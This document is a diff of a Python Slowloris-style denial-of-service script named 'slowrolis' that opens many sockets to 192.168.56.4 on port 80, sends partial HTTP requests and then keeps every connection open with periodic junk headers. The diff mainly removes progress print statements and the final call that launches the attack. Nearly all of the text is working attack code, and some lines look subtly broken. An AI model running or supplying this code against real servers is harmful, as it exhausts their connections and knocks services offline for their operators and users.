@@ -23,7 +23,6 @@ def slowrolis():
         ip = "192.168.56.4"
         port = 80
         all_sockets = []
-        print("Creating sockets...")
         for k in range(num_sockets):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -38,18 +37,14 @@ def slowrolis():
             print("[",num,"]")
             num += 1 
             r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
-            print("Successfully sent [+] GET /? HTTP /1.1 ...")
             for header in headers:
                 r.send(bytes("{}\r\n".format(header).encode("utf-8")))
-            print("Successfully sent [+] Headers ...")
  
         while True:
             for v in all_sockets:
                 try:
                     v.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
-                    print("[-][-][*] Waiter sent.")
                 except:
-                    print("[-] A socket failed, reattempting...")
                     all_sockets.remove(v)
                     try:
                         v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -62,15 +57,12 @@ def slowrolis():
                     except:
                         pass
  
-            print("\n\n[*] Successfully sent [+] KEEP-ALIVE headers...\n")
-            print("Sleeping off ...")
+
             time.sleep(10)
             
         
         
     except ConnectionRefusedError:
-        print("[-] Connection refused, retrying...")
         slowrolis()
     
  
-slowrolis()
